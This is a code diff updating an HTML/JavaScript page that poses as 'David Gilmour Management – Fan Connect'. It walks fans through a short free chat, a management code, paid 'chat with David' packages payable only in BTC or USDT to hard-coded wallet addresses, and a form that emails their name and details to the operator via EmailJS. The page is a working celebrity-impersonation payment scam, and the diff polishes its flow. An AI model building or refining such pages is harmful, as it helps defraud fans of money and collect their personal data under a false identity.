@@ -6,60 +6,67 @@
   <style>
     body {
       font-family: Arial, sans-serif;
-      background: url('https://images.unsplash.com/photo-1521737604893-d14cc237f11d?ixlib=rb-4.0.3&auto=format&fit=crop&w=1500&q=80') no-repeat center center/cover;
+      background: linear-gradient(135deg, #1a1a1a, #333333);
       margin: 0;
       padding: 0;
       color: white;
       text-align: center;
     }
     header {
-      background: rgba(0, 0, 0, 0.7);
+      background: rgba(0, 0, 0, 0.85);
       padding: 20px;
-      font-size: 36px;
+      font-size: 32px;
       font-weight: bold;
+      letter-spacing: 1px;
     }
     section {
       background: rgba(0, 0, 0, 0.6);
       margin: 20px auto;
-      padding: 30px;
-      border-radius: 12px;
-      width: 80%;
+      padding: 25px;
+      border-radius: 14px;
+      width: 85%;
       max-width: 700px;
-      font-size: 20px;
-      display: none;
+      font-size: 18px;
+      box-shadow: 0 4px 15px rgba(0,0,0,0.5);
     }
     h2 {
-      font-size: 28px;
+      font-size: 26px;
       margin-bottom: 10px;
+      color: #00ff9d;
     }
     label {
       display: block;
-      margin-top: 15px;
-      font-size: 20px;
+      margin-top: 12px;
+      font-size: 18px;
       text-align: left;
     }
     input, select, button, textarea {
       width: 100%;
       padding: 12px;
       margin-top: 8px;
-      font-size: 18px;
+      font-size: 16px;
       border-radius: 6px;
       border: none;
     }
     button {
-      background: green;
+      background: #00cc66;
       color: white;
       cursor: pointer;
-      font-size: 20px;
-      margin-top: 20px;
+      font-size: 18px;
+      margin-top: 18px;
+      transition: 0.3s;
+    }
+    button:hover {
+      background: #00994d;
     }
     #chatSection {
+      display: none;
       margin-top: 20px;
     }
     textarea {
       width: 100%;
       height: 150px;
-      font-size: 18px;
+      font-size: 16px;
       padding: 10px;
     }
     .wallet-box {
@@ -77,42 +84,49 @@
     David Gilmour Management – Fan Connect
   </header>
 
-  <!-- Step 1: Short Chat -->
+  <!-- Step 1 -->
   <section id="step1">
-    <h2>Step 1: Free Short Chat</h2>
-    <p>You can chat with the management for <strong>5 minutes</strong> for free. After that, please proceed to Step 2.</p>
+    <h2>Step 1: Start Short Live Chat</h2>
     <button onclick="startShortChat()">Start Live Chat</button>
-    <div id="shortChatMsg" style="margin-top:15px; font-size:18px; color:yellow;"></div>
   </section>
 
-  <!-- Step 2: Management Code -->
-  <section id="step2">
+  <section id="chatInstruction" style="display:none;">
+    <h2>💬 Chat with Management</h2>
+    <p>Click the chat bubble at the bottom-right corner to chat with management.  
+    ⏳ You have 5 minutes of free chat. After that, reload the page to continue to Step 2.</p>
+  </section>
+
+  <!-- Step 2 -->
+  <section id="step2" style="display:none;">
     <h2>Step 2: Enter Management Code</h2>
-    <input type="text" id="managementCodeInput" placeholder="Enter management code">
+    <input type="text" id="managementCode" placeholder="Enter code from management">
     <button onclick="verifyManagementCode()">Submit Code</button>
   </section>
 
-  <!-- Step 3: Payment -->
-  <section id="step3">
-    <h2>Step 3: Select Chat Option & Make Payment</h2>
+  <!-- Step 3 -->
+  <section id="step3" style="display:none;">
+    <h2>Step 3: Payment Options</h2>
     <select id="paymentOption">
       <option value="">-- Select Chat Type --</option>
       <option value="100">30 Minutes Chat – $100</option>
       <option value="250">1 Hour 30 Minutes Chat – $250</option>
       <option value="1000">Voice/Video Call – $1,000</option>
     </select>
-    <button onclick="makePayment()">Show Wallet</button>
-    <div id="paymentPage" style="display:none;">
-      <h2>Select Payment Method</h2>
-      <button onclick="showWallet('btc')">Pay with BTC</button>
-      <button onclick="showWallet('usdt')">Pay with USDT</button>
-      <div id="walletBox" class="wallet-box"></div>
-      <button onclick="confirmPayment()">I Have Made Payment</button>
-    </div>
+    <button onclick="showPaymentPage()">Proceed to Payment</button>
   </section>
 
-  <!-- Step 4: Submit Payment Details -->
-  <section id="step4">
+  <!-- Payment Page -->
+  <section id="paymentPage" style="display:none;">
+    <h2>Send Payment</h2>
+    <p>Copy one of the wallet addresses below and complete your payment.</p>
+    <button onclick="showWallet('btc')">Pay with BTC</button>
+    <button onclick="showWallet('usdt')">Pay with USDT</button>
+    <div id="walletBox" class="wallet-box"></div>
+    <button onclick="markPaymentDone()">I Have Made Payment</button>
+  </section>
+
+  <!-- Step 4 -->
+  <section id="step4" style="display:none;">
     <h2>Step 4: Submit Your Details</h2>
     <form id="paymentForm">
       <label for="name">Your Name:</label>
@@ -128,16 +142,16 @@
     </form>
   </section>
 
-  <!-- Step 5: Enter Access Code -->
-  <section id="step5">
+  <!-- Step 5 -->
+  <section id="step5" style="display:none;">
     <h2>Step 5: Enter Your Access Code</h2>
     <input type="text" id="accessCode" placeholder="Enter code here">
     <button onclick="verifyCode()">Unlock Chat</button>
   </section>
 
-  <!-- Final Chat Section -->
+  <!-- Chat Section -->
   <section id="chatSection">
-    <h2>Live Chat</h2>
+    <h2>🎶 Live Chat</h2>
     <textarea placeholder="Start chatting..."></textarea>
   </section>
 
@@ -145,65 +159,58 @@
   <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
   <script>
     (function(){
-      emailjs.init("uu8vvZMQLlVYT_YjA"); // Your public key
+      emailjs.init("uu8vvZMQLlVYT_YjA"); // your EmailJS public key
     })();
 
-    // Reset everything on first visit
-    if(!localStorage.getItem("firstVisit")) {
-      localStorage.clear();
-      localStorage.setItem("firstVisit", "true");
-    }
-
     let generatedCode = "";
-    let managementCode = "MGMT2025"; // Change this to whatever you want
+    let managementCode = "MGMT2025"; // fixed code you give in short chat
 
-    function startShortChat(){
-      document.getElementById("shortChatMsg").innerText =
-        "✅ Chat bubble is now active below. Please click it to talk with management.";
+    // Short chat starter
+    function startShortChat() {
+      document.getElementById("chatInstruction").style.display = "block";
       Tawk_API.showWidget();
-
-      // End after 5 mins
+      alert("Short chat started! Remember: 5 minutes free trial.");
       setTimeout(() => {
         localStorage.setItem("shortChatEnded", "true");
+        alert("⏳ Your free trial has ended. Reload the page to continue.");
         Tawk_API.hideWidget();
-        alert("⏳ Free chat ended. Reload the page to continue to Step 2.");
       }, 5 * 60 * 1000);
     }
 
-    function verifyManagementCode(){
-      let input = document.getElementById("managementCodeInput").value;
-      if(input === managementCode) {
+    function verifyManagementCode() {
+      let code = document.getElementById("managementCode").value;
+      if(code === managementCode) {
         localStorage.setItem("managementCodeVerified", "true");
-        alert("✅ Correct! Reload the page to continue to Step 3.");
+        alert("✅ Code correct! Reload to proceed to payment.");
+        location.reload();
       } else {
         alert("❌ Invalid code.");
       }
     }
 
-    function makePayment() {
-      let option = document.getElementById("paymentOption").value;
-      if(option) {
-        document.getElementById("paymentPage").style.display = "block";
-        window.scrollTo(0,document.body.scrollHeight);
-      } else {
-        alert("Select a chat option first.");
-      }
+    function showPaymentPage() {
+      document.getElementById("paymentPage").style.display = "block";
     }
 
     function showWallet(type) {
       let walletBox = document.getElementById("walletBox");
       if(type === "btc") {
-        walletBox.innerHTML =
-          "<strong>Send BTC to:</strong><br><input type='text' value='bc1ql35qu8wzlpc5cs5d7hgtk5srep48f7j0x27yr0' readonly style='width:100%; padding:8px;' onclick='this.select();document.execCommand(\"copy\");alert(\"BTC Address Copied!\")'>";
+        walletBox.innerHTML = "<strong>BTC Address:</strong><br>bc1ql35qu8wzlpc5cs5d7hgtk5srep48f7j0x27yr0 <br><button onclick='copyWallet(\"bc1ql35qu8wzlpc5cs5d7hgtk5srep48f7j0x27yr0\")'>Copy</button>";
       } else {
-        walletBox.innerHTML =
-          "<strong>Send USDT to:</strong><br><input type='text' value='TVEKPhAMmXQwC7GR95UJrDV8DEboUHJBYW' readonly style='width:100%; padding:8px;' onclick='this.select();document.execCommand(\"copy\");alert(\"USDT Address Copied!\")'>";
+        walletBox.innerHTML = "<strong>USDT Address:</strong><br>TVEKPhAMmXQwC7GR95UJrDV8DEboUHJBYW <br><button onclick='copyWallet(\"TVEKPhAMmXQwC7GR95UJrDV8DEboUHJBYW\")'>Copy</button>";
       }
     }
 
-    function confirmPayment(){
+    function copyWallet(addr) {
+      navigator.clipboard.writeText(addr).then(() => {
+        alert("Wallet address copied!");
+      });
+    }
+
+    function markPaymentDone() {
       localStorage.setItem("paymentDone", "true");
-      alert("✅ Payment confirmed. Reload the page to continue to Step 4.");
+      alert("✅ Payment marked done! Reload to continue.");
+      location.reload();
     }
 
     document.getElementById("paymentForm").addEventListener("submit", function(event) {
@@ -219,9 +226,10 @@
       emailjs.send("service_offzcjp", "template_5bcdhpd", templateParams)
         .then(function(response) {
           localStorage.setItem("detailsSubmitted", "true");
-          alert("✅ Details submitted! Reload the page to continue to Step 5.");
+          alert("✅ Details submitted! Access code sent to your email. Reload to enter your code.");
+          location.reload();
         }, function(error) {
-          alert("FAILED to send email. Try again. " + JSON.stringify(error));
+          alert("❌ FAILED to send email. Try again. " + JSON.stringify(error));
         });
     });
 
@@ -230,44 +238,43 @@
       if(code === generatedCode) {
         document.getElementById("chatSection").style.display = "block";
         Tawk_API.showWidget();
-        alert("✅ Access code correct! Final chat unlocked.");
+        alert("🎉 Access granted! You can now chat with David.");
       } else {
-        alert("❌ Invalid code.");
+        alert("❌ Invalid access code.");
       }
     }
 
-    // Step handling
-    window.onload = function(){
-      if(localStorage.getItem("detailsSubmitted")) {
+    // Unlock steps on load
+    window.addEventListener("load", function() {
+      if(localStorage.getItem("detailsSubmitted") === "true") {
         document.getElementById("step5").style.display = "block";
-      } else if(localStorage.getItem("paymentDone")) {
+      } else if(localStorage.getItem("paymentDone") === "true") {
         document.getElementById("step4").style.display = "block";
-      } else if(localStorage.getItem("managementCodeVerified")) {
+      } else if(localStorage.getItem("managementCodeVerified") === "true") {
         document.getElementById("step3").style.display = "block";
-      } else if(localStorage.getItem("shortChatEnded")) {
+      } else if(localStorage.getItem("shortChatEnded") === "true") {
         document.getElementById("step2").style.display = "block";
       } else {
         document.getElementById("step1").style.display = "block";
       }
-    }
+    });
   </script>
 
   <!--Start of Tawk.to Script-->
   <script type="text/javascript">
-    var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
-    (function(){
-      var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
-      s1.async=true;
-      s1.src='https://embed.tawk.to/68a0948fa4fc79192a7c8dc2/1j2pk8kgl';
-      s1.charset='UTF-8';
-      s1.setAttribute('crossorigin','*');
-      s0.parentNode.insertBefore(s1,s0);
-    })();
+  var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
+  (function(){
+    var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
+    s1.async=true;
+    s1.src='https://embed.tawk.to/68a0948fa4fc79192a7c8dc2/1j2pk8kgl';
+    s1.charset='UTF-8';
+    s1.setAttribute('crossorigin','*');
+    s0.parentNode.insertBefore(s1,s0);
+  })();
 
-    // Show widget initially (fans can start short chat)
-    Tawk_API.onLoad = function(){
-        Tawk_API.showWidget();
-    };
+  Tawk_API.onLoad = function(){
+    Tawk_API.hideWidget();
+  };
   </script>
   <!--End of Tawk.to Script-->
 </body>
